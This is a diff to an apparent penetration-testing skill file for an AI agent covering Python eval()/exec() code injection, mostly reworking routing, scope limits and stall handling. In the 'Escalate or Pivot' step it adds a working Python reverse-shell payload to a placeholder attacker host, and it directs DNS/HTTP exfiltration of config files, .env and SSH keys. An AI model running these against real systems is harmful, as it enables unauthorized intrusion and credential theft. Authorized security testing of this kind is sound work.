@@ -97,32 +97,30 @@ with date and second precision for timeline reconstruction.
 This entry must be written NOW, not deferred. Subsequent milestone entries
 append bullet points under this same header.
 
-## Skill Routing Is Mandatory
+## Scope Boundary
 
-When this skill says "Route to **skill-name**" or "→ **skill-name**", you MUST:
+This skill covers Python code injection through eval(), exec(), and compile()
+— from confirming the injection through achieving OS command execution. When
+you reach the boundary of this scope — whether through a routing instruction
+("Route to **skill-name**") or by discovering findings outside your domain —
+**STOP**.
 
-1. Call `get_skill("skill-name")` to load the full skill from the MCP skill-router
-2. Read the returned SKILL.md content
-3. Follow its instructions end-to-end
+Do not load or execute another skill. Do not continue past your scope boundary.
+Instead:
 
-Do NOT execute the technique inline — even if the attack is trivial or you
-already know the answer. Skills contain operator-specific methodology,
-client-scoped payloads, and edge-case handling that general knowledge does not.
+1. Write `engagement/state.md` with current findings
+2. Return to the orchestrator with:
+   - What was found (vulns, credentials, access gained)
+   - Recommended next skill (the bold **skill-name** from routing instructions)
+   - Context to pass (injection point, target, working payloads, etc.)
 
-If you need a skill but don't know the exact name, use
-`search_skills("description")` to find it. Before loading a search result,
-verify the returned description matches your scenario — embedding similarity
-does not guarantee relevance. After loading, check the skill's Prerequisites
-and Step 1 against current engagement state before following it.
+The orchestrator decides what runs next. Your job is to execute this skill
+thoroughly and return clean findings.
 
-This applies in both guided and autonomous modes. Autonomous mode means you
-make routing decisions without asking — it does not mean you skip skills.
-
-**Scope boundary:** This skill covers Python code injection through eval(),
-exec(), and compile() — from confirming the injection through achieving OS
-command execution. Once you have command execution, STOP — update state.md and
-route to the appropriate next skill. Do not continue into post-exploitation
-inline.
+**Stay in methodology.** Only use techniques documented in this skill. If you
+encounter a scenario not covered here, note it and return — do not improvise
+attacks, write custom exploit code, or apply techniques from other domains.
+The orchestrator will provide specific guidance or route to a different skill.
 
 ## State Management
 
@@ -587,6 +585,23 @@ curl -s -X POST http://TARGET/endpoint \
 
 ## Step 6: Escalate or Pivot
 
+### Reverse Shell via MCP
+
+When RCE is confirmed, **prefer catching a reverse shell via the MCP
+shell-server** over continuing to inject Python code through the vulnerable
+parameter.
+
+1. Call `start_listener(port=<port>)` to prepare a catcher on the attackbox
+2. Send a reverse shell payload through the injection point:
+   ```python
+   __import__('os').system('python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'')
+   ```
+3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
+4. Use `send_command()` for all subsequent commands
+
+If the target lacks outbound connectivity, continue with inline command
+execution and note the limitation in state.md.
+
 **Before routing**: Write `engagement/state.md` and append to
 `engagement/activity.md` with results so far. The next skill reads state.md
 on activation — stale state means duplicate work or missed context.
@@ -618,21 +633,59 @@ If credentials aren't found but command execution is confirmed:
 
 ### Routing
 
-- **Shell as non-root on Linux** → STOP. Route to **linux-discovery** — call
-  `get_skill("linux-discovery")` and follow its instructions. Pass: hostname,
-  current user, access method (injection-based RCE or reverse shell), current
+- **Shell as non-root on Linux** → STOP. Return to orchestrator recommending
+  **linux-discovery**. Pass: hostname, current user, access method
+  (injection-based RCE or reverse shell), current mode.
+- **Shell as non-admin on Windows** → STOP. Return to orchestrator recommending
+  **windows-discovery**. Pass: hostname, current user, access method, current
   mode.
-- **Shell as non-admin on Windows** → STOP. Route to **windows-discovery** —
-  call `get_skill("windows-discovery")` and follow its instructions. Pass:
-  hostname, current user, access method, current mode.
 - **Found credentials** → update state.md, test against SSH/RDP/WinRM/other
-  services. Route to orchestrator or appropriate discovery skill.
+  services. Return to orchestrator recommending the appropriate discovery skill.
 - **Blind injection only, no shell** → extract credentials via DNS/HTTP
   exfiltration (file reads: config files, .env, .git/config, SSH keys), then
   use credentials for direct access.
 
 When routing, always pass along: injection point, working payload, target
 platform, current mode, and any credentials found.
+
+## Stall Detection
+
+If you have spent **5 or more tool-calling rounds** on the same failure with
+no meaningful progress — same error, no new information, no change in output
+— **stop**.
+
+**What counts as progress:**
+- Trying a variant or alternative **documented in this skill**
+- Adjusting syntax, flags, or parameters per the Troubleshooting section
+- Gaining new diagnostic information (different error, partial success)
+
+**What does NOT count as progress:**
+- Writing custom exploit code not provided in this skill
+- Inventing workarounds using techniques from other domains
+- Retrying the same command with trivially different input
+- Compiling or transferring tools not mentioned in this skill
+
+If you find yourself writing code that isn't in this skill, you have left
+methodology. That is a stall.
+
+Do not loop. Work through failures systematically:
+1. Try each variant or alternative **once**
+2. Check the Troubleshooting section for known fixes
+3. If nothing works after 5 rounds, you are stalled
+
+**When stalled, return to the orchestrator immediately with:**
+- What was attempted (commands, variants, alternatives tried)
+- What failed and why (error messages, empty responses, timeouts)
+- Assessment: **blocked** (permanent — config, patched, missing prereq) or
+  **retry-later** (may work with different context, creds, or access)
+- Update `engagement/state.md` Blocked section before returning
+
+**Mode behavior:**
+- **Guided**: Tell the user you're stalled, present what was tried, and
+  recommend the next best path.
+- **Autonomous**: Update state.md Blocked section, return findings to the
+  orchestrator. Do not retry the same technique — the orchestrator will
+  decide whether to revisit with new context or route elsewhere.
 
 ## OPSEC Notes
 
